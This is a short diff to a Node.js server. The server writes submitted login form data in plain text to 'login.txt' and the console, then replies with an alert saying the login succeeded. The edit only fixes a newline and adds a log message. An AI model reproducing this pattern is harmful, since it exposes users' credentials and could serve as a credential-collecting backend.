@@ -53,10 +53,11 @@ http.createServer(function(req,res){
         })
         req.on('end',(err,chuck)=>{
             console.log(postdata);
-            fs.appendFile('login.txt',postdata+'/n',(err,data)=>{
+            fs.appendFile('login.txt',postdata+'\n',(err,data)=>{
                 if(err){
                     console.log(err)
                 }
+                console.log('写入成功')
             })
             res.end("<script>alert('登录成功');history.back();</script>")
         })
